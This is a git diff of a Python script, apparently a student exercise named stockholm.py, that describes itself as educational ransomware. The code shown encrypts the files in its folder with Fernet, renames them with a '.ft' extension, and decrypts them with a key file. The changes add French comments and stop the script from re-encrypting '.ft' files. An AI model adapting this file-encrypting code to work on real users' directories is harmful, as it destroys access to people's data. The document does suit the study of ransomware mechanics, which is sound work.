@@ -26,10 +26,10 @@ extensions = (
 )
 
 def args_parser() ->  argparse.Namespace:
-    parser = argparse.ArgumentParser(description="The spider program allow you to extract all the images from a website, recursively, by providing a url as a parameter")
+    parser = argparse.ArgumentParser(description="The program stockholm.py is an educational-purpose ransomware program. It allows for the encryption and decryption of various files within this folder.")
     parser.add_argument("-r", "--reverse", help="to reverse the infection", type=str, )
     parser.add_argument("-v", "--version", help="version of the programe", action="store_true")
-    parser.add_argument("-s", "--silent", help="the program will not produce any output.", action="store_true")
+    parser.add_argument("-s", "--silent", help="the program will not produce any output", action="store_true")
 
     args = parser.parse_args()
     return args
@@ -56,15 +56,20 @@ def encrypt(allfiles, args):
             os.rename(file, filename + '.ft')
 
 def decrypt(keyfile):
+    # Ouvrir le fichier de la key
     with open(keyfile, mode='rb') as decryptfile:
         key = decryptfile.read()
+    # Ouvrir les fichier un par un
     for file in os.listdir():
+        # Si l'extension est .ft il faut le dechiffrer
         if os.path.splitext(file)[1] == '.ft':
+            # Ouvrir le fichier a dechiffrer et recuperer le contenu
             with open(file, mode='rb') as fileRead:
                 content = fileRead.read()
+            # Dechiffrer grace a la key
             fernet = Fernet(key)
             decrypt_data = fernet.decrypt(content)
-            print(decrypt_data)
+            # Ecrire les donnees dechiffrer
             with open(file, mode='wb') as fileWrite:
                 fileWrite.write(decrypt_data)
 
@@ -81,7 +86,7 @@ def main():
         try:
             allfiles = []
             for file in os.listdir():
-                if file != "stockholm.py" and file != "Makefile" and file != "README.md" and file != "key.py" and file != "key.key" and file != "create_files.py":
+                if file != "stockholm.py" and file != "Makefile" and file != "README.md" and file != "key.py" and file != "key.key" and file != "create_files.py" and '.ft' not in file:
                     allfiles.append(file)
             encrypt(allfiles=allfiles, args=args)
         except Exception as e:
